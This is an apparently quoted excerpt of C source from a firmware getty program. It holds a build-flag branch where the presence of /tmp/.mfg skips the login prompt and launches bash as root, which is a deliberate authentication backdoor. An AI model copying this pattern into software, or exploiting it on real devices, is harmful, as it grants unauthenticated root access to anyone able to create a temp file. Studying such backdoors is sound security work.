...
#ifdef QSI
int qsi_file_exist(const char * file_name)
{
	if (file_name == NULL)
		return 0;
	struct stat l_file_info;     
	if (stat(file_name,&l_file_info) == 0)
		return (S_ISREG(l_file_info.st_mode) || S_ISLNK(l_file_info.st_mode));
	else
		return 0;
}
...
int getty_main(int argc, char **argv)
{
    ...
    #ifdef QSI
    if(qsi_file_exist("/tmp/.mfg"))
    {
        options.flags |= F_NOPROMPT;
        options.login="/bin/bash";

        xsetenv ( "HOME",    "/root" );
		xsetenv ( "SHELL",   "/bin/bash" );
		xsetenv ( "USER",    "root" );
		xsetenv ( "PATH",    "/usr/sbin:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/local/sbin");
    }
    #endif
